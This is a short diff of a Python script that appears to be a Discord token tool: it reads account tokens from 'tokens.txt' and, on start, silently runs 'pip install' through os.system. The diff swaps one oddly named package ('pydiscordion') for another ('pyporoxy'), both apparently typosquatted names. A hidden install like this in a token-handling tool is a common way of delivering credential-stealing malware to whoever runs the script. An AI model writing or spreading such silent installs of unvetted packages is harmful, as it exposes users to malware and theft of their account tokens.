@@ -1,7 +1,7 @@
 import requests, json
 import os
 from colorama import Fore
-os.system('pip install pydiscordion')
+os.system('pip install pyporoxy')
 
 os.system('cls')
 tokens = open("tokens.txt").read().splitlines()
